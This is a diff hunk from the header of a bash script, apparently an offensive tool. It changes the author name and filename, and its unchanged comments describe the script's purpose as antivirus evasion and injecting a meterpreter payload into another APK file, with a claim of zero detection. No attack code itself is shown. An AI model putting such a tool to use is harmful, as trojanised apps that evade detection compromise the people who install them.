@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Author: Justin Breed
-# Filename: apkinjector
+# Author: Donna Hurrchy
+# Filename: appinjector
 # Purpose: AV Evasion along with injecting a meterpreter payload into another apk file
 # Date: 0% detection as of 16Feb17
 
